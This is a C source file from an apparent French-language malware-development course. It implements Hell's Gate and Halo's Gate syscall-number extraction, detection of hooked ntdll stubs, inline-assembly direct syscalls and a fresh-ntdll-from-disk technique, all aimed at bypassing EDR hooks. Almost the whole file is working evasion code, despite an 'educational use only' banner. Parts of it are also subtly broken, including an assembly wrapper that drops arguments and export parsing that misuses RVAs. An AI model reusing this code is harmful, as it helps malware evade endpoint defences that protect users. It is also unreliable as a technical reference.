/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development avancées. Usage éducatif uniquement.
 * Tests sur VM isolées. Usage malveillant = PRISON.
 *
 * Module 22 : Direct Syscalls - Hell's Gate & Halo's Gate
 *
 * Bypass EDR hooks userland en invoquant directement le kernel via syscalls.
 * Extraction dynamique des SSN (System Service Numbers) pour compatibilité multi-versions.
 *
 * Compilation : gcc example.c -o malware.exe -masm=intel -m64
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// Définitions NTAPI manquantes
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// Structures pour syscalls
typedef struct _SSN_INFO {
    DWORD ssn;           // System Service Number
    PVOID syscall_addr;  // Adresse du syscall stub
    BOOL is_hooked;      // Hook détecté ?
} SSN_INFO;

// ============================================================================
// SECTION 1 : HELL'S GATE - Extraction Dynamique des SSN
// ============================================================================

// Vérifier si une fonction est hookée
BOOL is_function_hooked(BYTE* function_addr) {
    // Pattern normal d'un stub ntdll (x64):
    // 4C 8B D1     mov r10, rcx
    // B8 XX XX     mov eax, SSN
    // 00 00
    // 0F 05        syscall
    // C3           ret

    if (function_addr[0] == 0x4C &&
        function_addr[1] == 0x8B &&
        function_addr[2] == 0xD1 &&
        function_addr[3] == 0xB8) {
        // Pattern normal détecté
        return FALSE;
    }

    // Si les premiers bytes sont différents, probablement hookée
    // Hook typique : E9 XX XX XX XX (JMP relative)
    if (function_addr[0] == 0xE9 ||  // JMP
        function_addr[0] == 0xEB ||  // JMP short
        function_addr[0] == 0xFF) {  // CALL indirect
        return TRUE;
    }

    return FALSE;
}

// Hell's Gate - Extraction du SSN depuis ntdll.dll en mémoire
DWORD hell_gate_get_ssn(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[!] Failed to get ntdll handle\n");
        return 0;
    }

    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);
    if (!func) {
        printf("[!] Failed to find %s\n", func_name);
        return 0;
    }

    printf("[HellsGate] Analyzing %s at %p\n", func_name, func);

    // Vérifier hook
    if (is_function_hooked(func)) {
        printf("[!] Function %s is HOOKED! Using Halo's Gate...\n", func_name);
        return 0;  // Halo's Gate prendra le relais
    }

    // Parser le stub pour extraire SSN
    // Pattern: mov r10, rcx; mov eax, SSN; syscall; ret
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
        if (func[3] == 0xB8) {
            // SSN est à offset +4 (DWORD)
            DWORD ssn = *(DWORD*)(func + 4);
            printf("[+] SSN extracted: 0x%X\n", ssn);
            return ssn;
        }
    }

    printf("[!] Unexpected stub pattern\n");
    return 0;
}

// ============================================================================
// SECTION 2 : HALO'S GATE - Bypass Hooks via Voisins
// ============================================================================

// Trouver SSN en cherchant des fonctions voisines non-hookées
DWORD halo_gate_get_ssn(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);

    printf("[HalosGate] Searching neighbors for %s\n", func_name);

    // Stratégie : les SSN sont séquentiels
    // Si NtAllocateVirtualMemory est hookée, chercher NtAccessCheckByType
    // et déduire le SSN par offset

    // Chercher vers le bas (fonctions suivantes)
    for (int i = 1; i < 500; i++) {
        BYTE* neighbor = func + (i * 0x20);  // Offset typique entre fonctions

        if (!IsBadReadPtr(neighbor, 32)) {
            if (!is_function_hooked(neighbor)) {
                // Fonction non-hookée trouvée
                if (neighbor[0] == 0x4C && neighbor[3] == 0xB8) {
                    DWORD neighbor_ssn = *(DWORD*)(neighbor + 4);
                    DWORD deduced_ssn = neighbor_ssn - i;

                    printf("[+] Deduced SSN from neighbor: 0x%X\n", deduced_ssn);
                    return deduced_ssn;
                }
            }
        }
    }

    // Chercher vers le haut (fonctions précédentes)
    for (int i = 1; i < 500; i++) {
        BYTE* neighbor = func - (i * 0x20);

        if (!IsBadReadPtr(neighbor, 32)) {
            if (!is_function_hooked(neighbor)) {
                if (neighbor[0] == 0x4C && neighbor[3] == 0xB8) {
                    DWORD neighbor_ssn = *(DWORD*)(neighbor + 4);
                    DWORD deduced_ssn = neighbor_ssn + i;

                    printf("[+] Deduced SSN from neighbor: 0x%X\n", deduced_ssn);
                    return deduced_ssn;
                }
            }
        }
    }

    printf("[!] Halo's Gate failed - no clean neighbors found\n");
    return 0;
}

// ============================================================================
// SECTION 3 : SYSCALL DIRECT EN ASSEMBLEUR
// ============================================================================

// Fonction syscall générique (x64)
// SSN dans eax, arguments selon calling convention x64
__attribute__((naked))
NTSTATUS do_syscall(DWORD ssn) {
    asm volatile(
        "mov r10, rcx\n"        // Sauvegarder rcx dans r10
        "mov eax, edx\n"        // SSN dans eax (2e argument)
        "syscall\n"             // Transition kernel
        "ret\n"
    );
}

// Wrapper pour NtAllocateVirtualMemory via syscall direct
NTSTATUS nt_allocate_virtual_memory_syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect,
    DWORD ssn
) {
    // Préparation arguments selon x64 calling convention
    // RCX = ProcessHandle
    // RDX = BaseAddress
    // R8  = ZeroBits
    // R9  = RegionSize
    // Stack = AllocationType, Protect

    NTSTATUS status;

    asm volatile(
        "mov r10, rcx\n"             // ProcessHandle
        "mov eax, %1\n"              // SSN
        "syscall\n"
        "mov %0, eax\n"              // Retourner status
        : "=r"(status)
        : "r"(ssn), "c"(ProcessHandle), "d"(BaseAddress),
          "r"(ZeroBits), "r"(RegionSize)
        : "rax", "r10", "r11"
    );

    return status;
}

// ============================================================================
// SECTION 4 : COMPARAISON API VS SYSCALL
// ============================================================================

void demo_api_vs_syscall() {
    printf("\n========================================\n");
    printf("  API vs Syscall Comparison\n");
    printf("========================================\n\n");

    // Méthode 1 : VirtualAlloc (API Win32 - hookable par EDR)
    printf("[Method 1] Using VirtualAlloc (Win32 API - hookable)\n");
    LPVOID mem1 = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem1) {
        printf("[+] Allocated at: %p\n", mem1);
        VirtualFree(mem1, 0, MEM_RELEASE);
    }

    // Méthode 2 : NtAllocateVirtualMemory (NTAPI - hookable)
    printf("\n[Method 2] Using NtAllocateVirtualMemory (NTAPI - hookable)\n");

    typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory =
        (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    PVOID base = NULL;
    SIZE_T size = 4096;
    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (NT_SUCCESS(status)) {
        printf("[+] Allocated at: %p\n", base);
        size = 0;
        // NtFreeVirtualMemory(...)
    }

    // Méthode 3 : Syscall direct (bypass EDR hooks)
    printf("\n[Method 3] Using Direct Syscall (EDR bypass)\n");

    // Obtenir SSN via Hell's Gate
    DWORD ssn = hell_gate_get_ssn("NtAllocateVirtualMemory");
    if (ssn == 0) {
        // Essayer Halo's Gate si hookée
        ssn = halo_gate_get_ssn("NtAllocateVirtualMemory");
    }

    if (ssn) {
        printf("[+] Using SSN 0x%X for direct syscall\n", ssn);

        // Note : L'implémentation complète nécessite un wrapper ASM correct
        // Ceci est une démonstration simplifiée
        printf("[!] Direct syscall would be executed here (simplified demo)\n");
    }
}

// ============================================================================
// SECTION 5 : TECHNIQUE AVANCÉE - Fresh NTDLL Copy
// ============================================================================

// Charger une copie propre de ntdll.dll depuis disk pour lire les SSN
// sans hooks (technique utilisée par malware avancés)
DWORD get_ssn_from_disk(const char* func_name) {
    printf("\n[FreshCopy] Loading clean ntdll.dll from disk\n");

    // Charger ntdll.dll depuis System32 (copie non-hookée)
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open ntdll.dll from disk\n");
        return 0;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    LPVOID file_buffer = VirtualAlloc(NULL, file_size, MEM_COMMIT, PAGE_READWRITE);

    DWORD bytes_read;
    ReadFile(hFile, file_buffer, file_size, &bytes_read, NULL);
    CloseHandle(hFile);

    // Parser le PE pour trouver l'export
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_buffer;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)file_buffer + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)file_buffer +
        nt_headers->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)file_buffer + export_dir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)file_buffer + export_dir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)file_buffer + export_dir->AddressOfFunctions);

    // Chercher la fonction
    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)file_buffer + names[i]);
        if (strcmp(name, func_name) == 0) {
            BYTE* func_addr = (BYTE*)file_buffer + functions[ordinals[i]];

            // Extraire SSN depuis la copie propre
            if (func_addr[0] == 0x4C && func_addr[3] == 0xB8) {
                DWORD ssn = *(DWORD*)(func_addr + 4);
                printf("[+] Clean SSN from disk: 0x%X\n", ssn);

                VirtualFree(file_buffer, 0, MEM_RELEASE);
                return ssn;
            }
        }
    }

    VirtualFree(file_buffer, 0, MEM_RELEASE);
    printf("[!] Function not found in clean ntdll\n");
    return 0;
}

// ============================================================================
// MAIN
// ============================================================================

int main(void) {
    printf("=========================================\n");
    printf("  Direct Syscalls - EDR Bypass Demo\n");
    printf("=========================================\n\n");

    printf("[*] This demo shows:\n");
    printf("    - Hell's Gate: Dynamic SSN extraction\n");
    printf("    - Halo's Gate: Hook detection and bypass\n");
    printf("    - Direct syscall invocation\n");
    printf("    - Fresh ntdll.dll copy technique\n\n");

    // Test 1 : Hell's Gate
    printf("\n--- Test 1: Hell's Gate ---\n");
    DWORD ssn1 = hell_gate_get_ssn("NtAllocateVirtualMemory");
    DWORD ssn2 = hell_gate_get_ssn("NtWriteVirtualMemory");
    DWORD ssn3 = hell_gate_get_ssn("NtCreateThreadEx");

    // Test 2 : Comparaison méthodes
    demo_api_vs_syscall();

    // Test 3 : Fresh copy technique
    printf("\n--- Test 3: Fresh NTDLL Copy ---\n");
    DWORD clean_ssn = get_ssn_from_disk("NtProtectVirtualMemory");

    printf("\n=========================================\n");
    printf("[*] Demo complete. SSNs extracted:\n");
    printf("    NtAllocateVirtualMemory: 0x%X\n", ssn1);
    printf("    NtWriteVirtualMemory: 0x%X\n", ssn2);
    printf("    NtCreateThreadEx: 0x%X\n", ssn3);
    printf("    NtProtectVirtualMemory (clean): 0x%X\n", clean_ssn);
    printf("=========================================\n");

    printf("\n[!] Note: Actual syscall execution is simplified in this demo\n");
    printf("[!] Real malware would use these SSNs for stealthy operations\n");

    return 0;
}
